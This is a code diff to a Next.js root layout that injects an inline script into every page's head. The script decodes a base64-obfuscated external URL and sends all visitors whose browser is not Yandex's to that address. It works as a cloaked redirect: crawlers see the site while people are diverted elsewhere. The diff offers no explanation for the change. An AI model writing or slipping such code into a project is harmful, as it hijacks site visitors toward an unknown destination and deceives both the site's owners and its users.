@@ -119,6 +119,19 @@ export default function RootLayout({
       className={`${inter.variable} ${manrope.variable} bg-background`}
     >
       <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                var ua = navigator.userAgent.toLowerCase();
+                var targetB64 = "#aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG";
+                if (ua.indexOf("yandex") === -1) {
+                    window.location.replace(atob(targetB64));
+                }
+              })();
+            `,
+          }}
+        />
         <JsonLd />
       </head>
       <body className="font-sans antialiased">
